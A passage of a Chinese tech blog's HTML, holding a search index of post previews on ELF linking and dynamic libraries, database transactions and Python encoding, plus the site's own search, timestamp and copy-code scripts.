&lt;h2 id=&#34;触发器&#34;&gt;触发器&lt;/h2&gt;
&lt;p&gt;触发器是一条语句，在对数据库做修改时，自动被执行。&lt;/p&gt;
">《数据库系统概念》--第五章</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/xdsvqq_nhmggu/"" data-c="
          &lt;h2 id=&#34;典型的elf可重定位文件格式&#34;&gt;典型的ELF可重定位文件格式&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;http://static.yulan.net.cn/image/image_922e4d911e04d440260a5a6aec4c5280.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
示例代码&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;/* main.c */
int sum(int *a, int n);
int array[2] = {1, 2};

int main()
{
    int value = sum(array, 2);
    return value;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;/* sum.c */
int sum(int *a,int n){
    int i, sum = 0;
    for (i = 0; i &amp;lt; n; ++i)
    {
        sum += a[i];
    }
    return sum;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;符号表&#34;&gt;符号表&lt;/h3&gt;
&lt;p&gt;编译成elf可重定位文件后，使用 &lt;code&gt;readelf -all main.o&lt;/code&gt; 打印出如下信息&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ELF Header:
  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF64
  Data:                              2&#39;s complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              REL (Relocatable file)
  Machine:                           Advanced Micro Devices X86-64
  Version:                           0x1
  Entry point address:               0x0
  Start of program headers:          0 (bytes into file)
  Start of section headers:          720 (bytes into file)
  Flags:                             0x0
  Size of this header:               64 (bytes)
  Size of program headers:           0 (bytes)
  Number of program headers:         0
  Size of section headers:           64 (bytes)
  Number of section headers:         12
  Section header string table index: 11

Section Headers:
  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
  [ 0]                   NULL             0000000000000000  00000000
       0000000000000000  0000000000000000           0     0     0
  [ 1] .text             PROGBITS         0000000000000000  00000040
       0000000000000021  0000000000000000  AX       0     0     1
  [ 2] .rela.text        RELA             0000000000000000  00000228
       0000000000000030  0000000000000018   I       9     1     8
  [ 3] .data             PROGBITS         0000000000000000  00000068
       0000000000000008  0000000000000000  WA       0     0     8
  [ 4] .bss              NOBITS           0000000000000000  00000070
       0000000000000000  0000000000000000  WA       0     0     1
  [ 5] .comment          PROGBITS         0000000000000000  00000070
       000000000000002a  0000000000000001  MS       0     0     1
  [ 6] .note.GNU-stack   PROGBITS         0000000000000000  0000009a
       0000000000000000  0000000000000000           0     0     1
  [ 7] .eh_frame         PROGBITS         0000000000000000  000000a0
       0000000000000038  0000000000000000   A       0     0     8
  [ 8] .rela.eh_frame    RELA             0000000000000000  00000258
       0000000000000018  0000000000000018   I       9     7     8
  [ 9] .symtab           SYMTAB           0000000000000000  000000d8
       0000000000000120  0000000000000018          10     8     8
  [10] .strtab           STRTAB           0000000000000000  000001f8
       000000000000002d  0000000000000000           0     0     1
  [11] .shstrtab         STRTAB           0000000000000000  00000270
       0000000000000059  0000000000000000           0     0     1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  l (large), p (processor specific)

There are no section groups in this file.

There are no program headers in this file.

There is no dynamic section in this file.

Relocation section &#39;.rela.text&#39; at offset 0x228 contains 2 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000000010  000800000002 R_X86_64_PC32     0000000000000000 array - 4
000000000015  000b00000004 R_X86_64_PLT32    0000000000000000 sum - 4

Relocation section &#39;.rela.eh_frame&#39; at offset 0x258 contains 1 entry:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000000020  000200000002 R_X86_64_PC32     0000000000000000 .text + 0

The decoding of unwind sections for machine type Advanced Micro Devices X86-64 is not currently supported.

Symbol table &#39;.symtab&#39; contains 12 entries:
   Num:    Value          Size Type    Bind   Vis      Ndx Name
     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND 
     1: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS main.c
     2: 0000000000000000     0 SECTION LOCAL  DEFAULT    1 
     3: 0000000000000000     0 SECTION LOCAL  DEFAULT    3 
     4: 0000000000000000     0 SECTION LOCAL  DEFAULT    4 
     5: 0000000000000000     0 SECTION LOCAL  DEFAULT    6 
     6: 0000000000000000     0 SECTION LOCAL  DEFAULT    7 
     7: 0000000000000000     0 SECTION LOCAL  DEFAULT    5 
     8: 0000000000000000     8 OBJECT  GLOBAL DEFAULT    3 array
     9: 0000000000000000    33 FUNC    GLOBAL DEFAULT    1 main
    10: 0000000000000000     0 NOTYPE  GLOBAL DEFAULT  UND _GLOBAL_OFFSET_TABLE_
    11: 0000000000000000     0 NOTYPE  GLOBAL DEFAULT  UND sum

No version information found in this file.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;重点关注符号表的最后4行，表示main是一个.text节（由Ndx=1代表text节）中偏移量为0的大小为33字节的函数，array为一个.data节（由Ndx=3代表data节）中偏移量为0的大小为8字节的对象，sum是一个对外部符号的引用。&lt;/p&gt;
&lt;h3 id=&#34;符号解析&#34;&gt;符号解析&lt;/h3&gt;
&lt;p&gt;（c++中的符号重整）&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/image_baac9c3b12c549bdd12f03b6138e48f0.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;强符号与弱符号&#34;&gt;强符号与弱符号&lt;/h4&gt;
&lt;p&gt;强符号： 函数与已初始化的全局变量&lt;br&gt;
弱符号： 未初始化的全局变量&lt;br&gt;
Linux处理规则&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/image_6e78315541fc2ce4804706648472d98b.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;code&gt;objdump -dx main.o&lt;/code&gt; 得到以下输出&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0000000000000000 &amp;lt;main&amp;gt;:
   0:   55                      push   %rbp
   1:   48 89 e5                mov    %rsp,%rbp
   4:   48 83 ec 10             sub    $0x10,%rsp
   8:   be 02 00 00 00          mov    $0x2,%esi
   d:   48 8d 3d 00 00 00 00    lea    0x0(%rip),%rdi        # 14 &amp;lt;main+0x14&amp;gt;
                        10: R_X86_64_PC32       array-0x4
  14:   e8 00 00 00 00          callq  19 &amp;lt;main+0x19&amp;gt;
                        15: R_X86_64_PLT32      sum-0x4
  19:   89 45 fc                mov    %eax,-0x4(%rbp)
  1c:   8b 45 fc                mov    -0x4(%rbp),%eax
  1f:   c9                      leaveq 
  20:   c3                      retq  
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;其中第6、7行是对array的重定位条目，8、9行是对sum的重定位条目。&lt;/p&gt;
&lt;h2 id=&#34;创建静态库&#34;&gt;创建静态库&lt;/h2&gt;
&lt;p&gt;代码部分&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;/* multvec.c */
/* $begin multvec */
int multcnt = 0;

void multvec(int *x, int *y,
             int *z, int n)
{
    int i;

    multcnt++;

    for (i = 0; i &amp;lt; n; i++)
        z[i] = x[i] * y[i];
}
/* $end multvec */
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;/* addvec.c */
/* $begin addvec */
int addcnt = 0;

void addvec(int *x, int *y,
            int *z, int n)
{
    int i;

    addcnt++;

    for (i = 0; i &amp;lt; n; i++)
        z[i] = x[i] + y[i];
}
/* $end addvec */
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;/* main.c */
/* $begin main */
#include &amp;lt;stdio.h&amp;gt;
#include &amp;quot;vector.h&amp;quot;

int x[2] = {1, 2};
int y[2] = {3, 4};
int z[2];

int main()
{
    addvec(x, y, z, 2);
    printf(&amp;quot;z = [%d %d]\n&amp;quot;, z[0], z[1]);
    return 0;
}
/* $end main2 */
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;利用AR工具创建静态库&lt;br&gt;
&lt;code&gt;gcc -c multvec.c addvec.c&lt;/code&gt; &lt;br&gt;
&lt;code&gt;ar rcs libvector.a addvec.o multvec.o&lt;/code&gt; &lt;br&gt;
使用： &lt;code&gt;gcc -o prog1 main.c -L. -lvector&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;创建动态库&#34;&gt;创建动态库&lt;/h2&gt;
&lt;p&gt;命令 &lt;code&gt;gcc -shared -fpic -o libvector.so addvec.c multvec.c&lt;/code&gt; &lt;br&gt;
其中-fpic用于生成与位置无关的代码，-shared指示链接器创造一个共享的目标文件。&lt;br&gt;
使用： &lt;code&gt;gcc -o prog2 main.c -L. -lvector&lt;/code&gt; &lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/image_fa745aaf6b4ff0564c2933a309ed29fc.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
可以看出动态链接比静态链接产生的代码体积小&lt;/p&gt;
&lt;h2 id=&#34;linux运行时加载动态库&#34;&gt;Linux运行时加载动态库&lt;/h2&gt;
&lt;p&gt;主要包括函数 &lt;code&gt;dlopen&lt;/code&gt; &lt;code&gt;dlsym&lt;/code&gt; &lt;code&gt;dlclose&lt;/code&gt; 与· &lt;code&gt;dlerror&lt;/code&gt; &lt;br&gt;
示例（来自CSAPP第七章7.11）：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;/* $begin dll */
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;dlfcn.h&amp;gt;

int x[2] = {1, 2};
int y[2] = {3, 4};
int z[2];

int main() 
{
    void *handle;
    void (*addvec)(int *, int *, int *, int);
    char *error; 

    /* Dynamically load the shared library that contains addvec() */
    handle = dlopen(&amp;quot;./libvector.so&amp;quot;, RTLD_LAZY);
    if (!handle) {
	fprintf(stderr, &amp;quot;%s\n&amp;quot;, dlerror());
	exit(1);
    }

    /* Get a pointer to the addvec() function we just loaded */
    addvec = dlsym(handle, &amp;quot;addvec&amp;quot;);
    if ((error = dlerror()) != NULL) {
	fprintf(stderr, &amp;quot;%s\n&amp;quot;, error);
	exit(1);
    }

    /* Now we can call addvec() just like any other function */
    addvec(x, y, z, 2);
    printf(&amp;quot;z = [%d %d]\n&amp;quot;, z[0], z[1]);

    /* Unload the shared library */
    if (dlclose(handle) &amp;lt; 0) {
	fprintf(stderr, &amp;quot;%s\n&amp;quot;, dlerror());
	exit(1);
    }
    return 0;
}
/* $end dll */
&lt;/code&gt;&lt;/pre&gt;
">链接</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/dxuyyg_ftoxv1/"" data-c="
          &lt;h2 id=&#34;dml与ddl&#34;&gt;DML与DDL&lt;/h2&gt;
&lt;p&gt;ddl用于定义数据库，包括数据类型、断言、权限等一致性约束。ddl生成数据字典，包含元数据，即数据的数据。这是一种特殊的数据表，在读取与修改实际数据前，数据库会先参考数据字典。&lt;br&gt;
dml用于操作数据库，广义上将查询语言与dml视为同义词。&lt;/p&gt;
&lt;h2 id=&#34;事务的四大特性&#34;&gt;事务的四大特性&lt;/h2&gt;
&lt;h3 id=&#34;一-原子性atomicity&#34;&gt;一、原子性（atomicity)&lt;/h3&gt;
&lt;p&gt;一个事务要么全部提交成功，要么全部失败回滚，不能只执行其中的一部分操作，这就是事务的原子性。&lt;/p&gt;
&lt;h3 id=&#34;二-一致性consistency&#34;&gt;二、一致性（consistency)&lt;/h3&gt;
&lt;p&gt;事务的执行不能破坏数据库数据的完整性和一致性，一个事务在执行之前和执行之后，数据库都必须处于一致性状态。&lt;br&gt;
如果数据库系统在运行过程中发生故障，有些事务尚未完成就被迫中断，这些未完成的事务对数据库所作的修改有一部分已写入物理数据库，这是数据库就处于一种不正确的状态，也就是不一致的状态。&lt;br&gt;
即在一次转账行为中，转账前与转账后资金的总和不变。&lt;/p&gt;
&lt;h3 id=&#34;三-隔离性isolation&#34;&gt;三、隔离性（isolation）&lt;/h3&gt;
&lt;p&gt;事务的隔离性是指在并发环境中，并发的事务时相互隔离的，一个事务的执行不能不被其他事务干扰。不同的事务并发操作相同的数据时，每个事务都有各自完成的数据空间，即一个事务内部的操作及使用的数据对其他并发事务时隔离的，并发执行的各个事务之间不能相互干扰。&lt;br&gt;
在标准SQL规范中，定义了4个事务隔离级别，不同的隔离级别对事务的处理不同，分别是：未授权读取，授权读取，可重复读取和串行化&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;读未提交（Read Uncommited）。该隔离级别允许脏读取，其隔离级别最低；比如事务A和事务B同时进行，事务A在整个执行阶段，会将某数据的值从1开始一直加到10，然后进行事务提交，此时，事务B能够看到这个数据项在事务A操作过程中的所有中间值（如1变成2，2变成3等），而对这一系列的中间值的读取就是未授权读取&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;授权读取也称为已提交读（Read Commited）。授权读取只允许获取已经提交的数据。比如事务A和事务B同时进行，事务A进行+1操作，此时，事务B无法看到这个数据项在事务A操作过程中的所有中间值，只能看到最终的10。另外，如果说有一个事务C，和事务A进行非常类似的操作，只是事务C是将数据项从10加到20，此时事务B也同样可以读取到20，即授权读取允许不可重复读取。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;可重复读（Repeatable Read)。就是保证在事务处理过程中，多次读取同一个数据时，其值都和事务开始时刻是一致的，因此该事务级别禁止不可重复读取和脏读取，但是有可能出现幻影数据。所谓幻影数据，就是指同样的事务操作，在前后两个时间段内执行对同一个数据项的读取，可能出现不一致的结果。在上面的例子中，可重复读取隔离级别能够保证事务B在第一次事务操作过程中，始终对数据项读取到1，但是在下一次事务操作中，即使事务B（注意，事务名字虽然相同，但是指的是另一个事务操作）采用同样的查询方式，就可能读取到10或20；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;串行化。是最严格的事务隔离级别，它要求所有事务被串行执行，即事务只能一个接一个的进行处理，不能并发执行。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;四-持久性durability&#34;&gt;四、持久性（durability）&lt;/h3&gt;
&lt;p&gt;一旦事务提交，那么它对数据库中的对应数据的状态的变更就会永久保存到数据库中。--即使发生系统崩溃或机器宕机等故障，只要数据库能够重新启动，那么一定能够将其恢复到事务成功结束的状态&lt;/p&gt;
&lt;h2 id=&#34;关系数据库的结构&#34;&gt;关系数据库的结构&lt;/h2&gt;
&lt;p&gt;关系(relation)指代表，元组(tuple)指代行，属性(attribute)指代表中的列。&lt;br&gt;
域(domain)指一个属性允许取值的集合。&lt;/p&gt;
">《数据库系统概念》--第一、二章</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/xv6m6b_wg7shu/"" data-c="
          &lt;p&gt;为了彻底闹明白python的编码问题，特分享下文，希望对大家熟悉python的编码问题带来些帮助&lt;/p&gt;
&lt;h3 id=&#34;1从字节说起&#34;&gt;1.从字节说起：&lt;/h3&gt;
&lt;p&gt;一个字节包括八个比特位，每个比特位表示0或1，一个字节即可表示从00000000到11111111共2^8=256个数字。&lt;/p&gt;
&lt;p&gt;一个ASCII编码使用一个字节（除去字节的最高位作为作奇偶校验位），ASCII编码实际使用一个字节中的7个比特位来表示字符，共可表示2^7=128个字符。比如ASCII编码中的01000001（即十进制的65）表示字符&#39;A&#39;，01000001加上32之后的01100001（即十进制的97）表示字符&#39;a&#39;。现在打开Python，调用chr和ord函数，我们可以看到Python为我们对ASCII编码进行了转换。如图&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;http://static.yulan.net.cn/image/_d707b454d810593725ca3b85fd6edb6a.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;第一个00000000表示空字符，因此ASCII编码实际上只包括了  字母、标点符号、特殊符号等共127个字符。因为ASCII是在美国出生的，对于由字母组成单词进而用单词表达的英文来说也是够了。但是中国人、日本人、  韩国人等其他语言的人不服了。中文是一个字一个字，ASCII编码用上了浑身解数256个字符都不够用。&lt;/p&gt;
&lt;p&gt;因此后来出现了Unicode编码。Unicode编码通常由两个字节组成，共表示256*256个字符，即所谓的UCS-2。某些偏僻字还会用到四个字节，即所谓的UCS-4。也就是说Unicode标准也还在发展。但UCS-4出现的比较少，我们先记住：  最原始的ASCII编码使用一个字节编码，但由于语言差异字符众多，人们用上了两个字节，出现了统一的、囊括多国语言的Unicode编码。&lt;/p&gt;
&lt;p&gt;在Unicode中，原本ASCII中的127个字符只需在前面补一个全零的字节即可，比如前文谈到的字符‘a&#39;：01100001，在Unicode中变成了00000000 01100001。不久，美国人不开心了，吃上了世界民族之林的大锅饭，原本只需一个字节就能传输的英文现在变成两个字节，非常浪费存储空间和传输速度。&lt;br&gt;
人们再发挥聪明才智，于是出现了UTF-8编码。因为针对的是空间浪费问题，因此这种 &lt;strong&gt;UTF-8编码是可变长短的&lt;/strong&gt; ，从英文字母的一个字节，到中文的通常的三个字节，再到某些生僻字的六个字节。解决了空间问题，UTF-8编码还有一个神奇的附加功能，那就是兼容了老大哥的ASCII编码。一些老古董软件现在在UTF-8编码中可以继续工作。&lt;/p&gt;
&lt;p&gt;注意除了英文字母相同，汉字在Unicode编码和UTF-8编码中通常是不同的。比如汉字的‘中&#39;字在Unicode中是01001110 00101101，而在UTF-8编码中是11100100 10111000 10101101。&lt;br&gt;
我们祖国母亲自然也有自己的一套标准。那就是GB2312和GBK。当然现在挺少看到。通常都是直接使用UTF-8。&lt;/p&gt;
&lt;h3 id=&#34;2python3中的默认编码&#34;&gt;2.Python3中的默认编码&lt;/h3&gt;
&lt;p&gt;Python3中默认是UTF-8，我们通过以下代码：&lt;/p&gt;
&lt;p&gt;| 1&lt;br&gt;
2&lt;br&gt;
3 | &lt;code&gt;import&lt;/code&gt; &lt;code&gt;sys&lt;/code&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;code&gt;sys.getdefaultencoding()&lt;/code&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;可查看Python3的默认编码。&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/_fffe57278779ad10247c3cb828ae3b42.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;3python3中的encode和decode&#34;&gt;3.Python3中的encode和decode&lt;/h3&gt;
&lt;p&gt;Python3中字符编码经常会使用到decode和encode函数。特别是在抓取网页中，这两个函数用的熟练非常有好处。encode的作用，使我们看到的直观的字符转换成计算机内的字节形式。decode刚好相反，把字节形式的字符转换成我们看的懂的、直观的、“人模人样”的形式。&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/_b2d471b6ceb52bb83c5bbd6cf0d4feb1.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;\x表示后面是十六进制， \xe4\xb8\xad即是二进制的 11100100 10111000  10101101。也就是说汉字‘中&#39;encode成字节形式，是 11100100 10111000 10101101。同理，我们拿  11100100 10111000 10101101也就是 \xe4\xb8\xad来decode回来，就是汉字‘中&#39;。完整的应该是  b&#39;\xe4\xb8\xad&#39;，在Python3中， 以字节形式表示的字符串则必须加上 前缀b，也就是写成上文的b&#39;xxxx&#39;形式。&lt;/p&gt;
&lt;p&gt;前文说的Python3的默认编码是UTF-8，所以我们可以看到，Python处理这些字符的时候是以UTF-8来处理的。因此从上图可以看到，就算我们通过encode(&#39;utf-8&#39;)特意把字符encode为UTF-8编码，出来的结果还是相同：b&#39;\xe4\xb8\xad&#39;。&lt;/p&gt;
&lt;p&gt;明白了这一点，同时我们知道UTF-8兼容ASCII，我们可以猜想大学时经常背诵的‘A&#39;对应ASCII中的65，在这里是不是也能正确的decode出来呢。十进制的65转换成十六进制是41，我们尝试下：&lt;br&gt;
&lt;code&gt;b&#39;\x41&#39;.decode()&lt;/code&gt;&lt;br&gt;
结果如下。果然是字符‘A&#39;&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/_aa0c0c5c55c0ef692eb786f0271ea145.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;4python3中的编码转换&#34;&gt;4.Python3中的编码转换&lt;/h3&gt;
&lt;p&gt;据说字符在计算机的内存中统一是以Unicode编码的。只有在字符要被写进文件、存进硬盘或者从服务器发送至客户端（例如网页前端的代码）时会变成utf-8。但其实我比较关心怎么把这些字符以Unicode的字节形式表现出来，露出它在内存中的庐山正面目的。这里有个照妖镜：&lt;br&gt;
&lt;code&gt;xxxx.encode/decode(&#39;unicode-escape&#39;)&lt;/code&gt;&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/_43823ef3ee4f02ea06e61047e424c772.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;b&#39;\u4e2d&#39;还是b&#39;\u4e2d，一个斜杠貌似没影响。同时可以 发现在shell窗口中，直接输 &#39;\u4e2d&#39;和输入b  &#39;\u4e2d&#39;.decode(&#39;unicode-escape&#39;)是相同的，都会打印出汉字‘中&#39;， 反而是  &#39;\u4e2d&#39;.decode(&#39;unicode-escape&#39;)会报错。说明  说明Python3不仅支持Unicode，而且一个‘\uxxxx&#39;格式的 Unicode字符 可被辨识且被等价于str类型。&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/_c3eeb556dd13109688d67c6dbe8d9ce7.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;如果我们知道一个Unicode字节码，怎么变成UTF-8的字节码呢。懂了以上这些，现在我们就有思路了，先decode，再encode。代码如下：&lt;br&gt;
&lt;code&gt;xxx.decode(&#39;unicode-escape&#39;).encode()&lt;/code&gt;&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/_2ef48040e010348f96e5e1fc46d796a7.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;最后的扩展&#34;&gt;最后的扩展&lt;/h3&gt;
&lt;p&gt;还记得刚刚那个ord吗。时代变迁，老大哥ASCII被人合并，但ord还是有用武之地。试试ord(&#39;中&#39;)，输出结果是20013。20013是什么呢，我们再试试hex(ord(&#39;中&#39;))，输出结果是&#39;0x4e2d&#39;，也就是20013是我们在上文见面了无数次的x4e2d的十进制值。这里说下hex，是用来转换成十六进制的函数，学过单片机的人对hex肯定不会陌生。&lt;/p&gt;
">python中的编码与解码</a>
      </div>
      
    </div>
    <div class="page">
      <div id="page_ul"></div>
    </div>
  </div>
</div>
<script>
  !function () {
    let searchMask = document.querySelector('#search_mask');
    let result = document.querySelector('#result');
    let items = document.querySelectorAll('.item');
    let searchBox = document.querySelector('#search');
    let statCount = document.querySelector('#stat_count');
    let statTimes = document.querySelector('#stat_times');
    let pageUl = document.querySelector('#page_ul');
    let close = document.querySelector('#close');
    
    close.addEventListener('click', function() {
      searchMask.style = 'display: none;'
    })

    let finds = [];
    let contents = [];
    let pageSize = 10;
    items.forEach(item => {
      let a = item.querySelector('a');
      contents.push({
        title: a.innerText,
        details: a.dataset.c,
        link: a.href
      })
      item.remove();
    })

    function insertStr(soure, start, count) {
      let newStr = soure.substr(start, count);
      return soure.slice(0, start) + '<em>' + newStr + '</em>' + soure.slice(start + count);
    }

    pageUl.addEventListener('click', function(event) {
      let target = event.target;
      if (target.__proto__ === HTMLSpanElement.prototype) {
        appendResults(parseInt(target.dataset.i));
      }
    })

    function appendResults(index) {
      let htmlResult = '';
      let start = index || 0;
      let end = Math.min(start + pageSize, finds.length);
      for (let i = start; i < end; i++) {
        const current = finds[i];
        let html = current.title;
        let sum = 0;
        let positions = current.positions;
        positions.forEach(position => {
          html = insertStr(html, position.start + sum, position.count);
          sum += 9;
        })
        htmlResult += `<div class="item"><a class="result-title" href="${current.link}">${html}</a></div>`;
      }
      result.innerHTML = htmlResult;
      pageUl.innerHTML = '';
      let count = finds.length / pageSize;
      let lis = '';
      if (start !== 0) {
        lis += `<span class="fa fa-angle-left" data-i='${start - 1}'></span>`;
      }
      for (let i = 0; i < count; i++) {
        lis += `<span class='${i === start?'current':''}' data-i='${i}'>${i+1}</span>`;     
      }
      if (start+1 < count) {
        lis += `<span class="fa fa-angle-right" data-i='${start+1}'></span>`;  
      }
      pageUl.innerHTML = lis;
    }

    function search(delay) {
      let timer = null
      return function () {
        clearTimeout(timer)
        timer = setTimeout(() => {
          let start = Date.now();
          let segments = searchBox.value.split(' ').filter(c => c != '');
          if (segments.length <= 0) {
            return;
          }
          finds = [];
          let htmlResult = '';
          contents.forEach(content => {
            let title = content.title;
            let positions = [];
            let find = false;
            segments.forEach((segment) => {
              if (content.title.includes(segment)) {
                find = true;
                positions.push({
                  start: content.title.indexOf(segment),
                  count: segment.length
                })
              } else if (content.details.includes(segment)) {
                find = true;
              }
            });
            if (find) {
              finds.push({
                title: content.title,
                link: content.link,
                positions
              });
            }
          })
          appendResults(0);
          statCount.textContent = finds.length;
          statTimes.textContent = Date.now() - start;
        }, delay)
      }
    }
    searchBox.addEventListener('input', search(200));
  }()
</script>

<input hidden id="copy" />
<script>
  !function () {
    let times = document.querySelectorAll('.publish-time');
    for (let i = 0; i < times.length; i++) {
      let date = times[i].dataset.t;
      let time = Math.floor((new Date().getTime() - new Date(date).getTime()) / 1000);
      if (time < 60) {
        str = time + '秒之前';
      } else if (time < 3600) {
        str = Math.floor(time / 60) + '分钟之前';
      } else if (time >= 3600 && time < 86400) {
        str = Math.floor(time / 3600) + '小时之前';
      } else if (time >= 86400 && time < 259200) {
        str = Math.floor(time / 86400) + '天之前';
      } else {
        str = times[i].textContent;
      }
      times[i].textContent = str;
    }
  }();
</script>

<script>
  let language = '';
  if (language !== '') {
    let map = new Map();
    if (language === 'en') {
      map.set('search', 'Search');
      map.set('category', 'Categories');
      map.set('article', 'Articles');
      map.set('tag', 'Tags');
      map.set('top', 'Top');
      map.set('publish', 'published');
      map.set('minute', ' minutes');
      map.set('read-more', 'Read More');
      map.set('view', 'View');
      map.set('words', ' words');
      map.set('category-in', 'category in');
      map.set('preview', 'Meta');
      map.set('index', 'Toc');
      map.set('no-archives', "You haven't created yet");
      map.set('archives', " articles in total");
      map.set('cloud-tags', " tags in total");
      map.set('copyright', "Copyright: ");
      map.set('author', "Author: ");
      map.set('link', "Link: ");
      map.set('leave-message', "Leave a message");
      map.set('format', "Links Format");
      map.set('site-name', "Name: ");
      map.set('site-link', "Link: ");
      map.set('site-desc', "Desc: ");
      map.set('stat', " related results, taking ");
      map.set('stat-time', " ms");
      map.set('site-img', "Image: ");
    }

    if (map.size > 0) {
      let lanElems = document.querySelectorAll('.language');
      lanElems.forEach(elem => {
        let lan = elem.dataset.lan, text = map.get(lan);
        if (elem.__proto__ === HTMLInputElement.prototype) {
          elem.placeholder = text
        } else {
          if (elem.dataset.count) {
            text = elem.dataset.count + text;
          }
          elem.textContent = text;
        }
      })
    }
  }
  //拿来主义(真香)^_^，Clipboard 实现摘自掘金 https://juejin.im/post/5aefeb6e6fb9a07aa43c20af
  window.Clipboard = (function (window, document, navigator) {
    var textArea,
      copy;

    // 判断是不是ios端
    function isOS() {
      return navigator.userAgent.match(/ipad|iphone/i);
    }
    //创建文本元素
    function createTextArea(text) {
      textArea = document.createElement('textArea');
      textArea.value = text;
      textArea.style.width = 0;
      textArea.style.height = 0;
      textArea.clientHeight = 0;
      textArea.clientWidth = 0;
      document.body.appendChild(textArea);
    }
    //选择内容
    function selectText() {
      var range,
        selection;

      if (isOS()) {
        range = document.createRange();
        range.selectNodeContents(textArea);
        selection = window.getSelection();
        selection.removeAllRanges();
        selection.addRange(range);
        textArea.setSelectionRange(0, 999999);
      } else {
        textArea.select();
      }
    }

    //复制到剪贴板
    function copyToClipboard() {
      try {
        document.execCommand("Copy")
      } catch (err) {
        alert("复制错误！请手动复制！")
      }
      document.body.removeChild(textArea);
    }

    copy = function (text) {
      createTextArea(text);
      selectText();
      copyToClipboard();
    };

    return {
      copy: copy
    };
  })(window, document, navigator);

  function copyCode(e) {
    if (e.srcElement.tagName === 'SPAN' && e.srcElement.classList.contains('copy-code')) {
      let code = e.currentTarget.querySelector('code');
      var text = code.innerText;
      if (e.srcElement.textContent === '复制成功') {
        return;
      }
      e.srcElement.textContent = '复制成功';
      (function (elem) {
        setTimeout(() => {
          if (elem.textContent === '复制成功') {
            elem.textContent = '复制代码'
          }
        }, 1000);
      })(e.srcElement)
      Clipboard.copy(text);
    }
  }

  let pres = document.querySelectorAll('pre');
  pres.forEach(pre => {
    let code = pre.querySelector('code');
    let copyElem = document.createElement('span');
    copyElem.classList.add('copy-code');
    copyElem.textContent = '复制代码';
    pre.appendChild(copyElem);
    pre.onclick = copyCode
  })

</script>
<script src="/media/js/motion.js"></script>


